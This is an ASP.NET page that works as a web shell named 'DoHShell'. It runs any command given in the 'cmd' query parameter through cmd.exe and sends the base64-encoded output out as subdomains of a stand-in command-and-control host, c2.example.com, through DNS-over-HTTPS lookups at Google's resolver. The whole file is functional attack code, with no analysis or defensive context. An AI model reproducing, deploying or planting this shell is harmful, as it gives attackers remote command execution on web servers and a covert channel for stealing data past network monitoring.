<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net.Http" %>
<%@ Import Namespace="System.Threading.Tasks" %>
<script runat="server">
    protected async void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            // Use DNS-over-HTTPS to retrieve command result (example: encode output in subdomain)
            string result = ExecuteCommand(cmd);
            string encoded = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(result)).Replace("+", "-").Replace("/", "_");
            string domain = encoded + ".c2.example.com";
            using (HttpClient client = new HttpClient())
            {
                string dnsQuery = $"https://dns.google.com/resolve?name={domain}&type=TXT";
                await client.GetStringAsync(dnsQuery);
            }
            Response.Write("Command result exfiltrated via DoH.");
        }
    }
    private string ExecuteCommand(string cmd)
    {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        return p.StandardOutput.ReadToEnd();
    }
</script>
<html><body><h2>DoHShell (DNS over HTTPS C2)</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
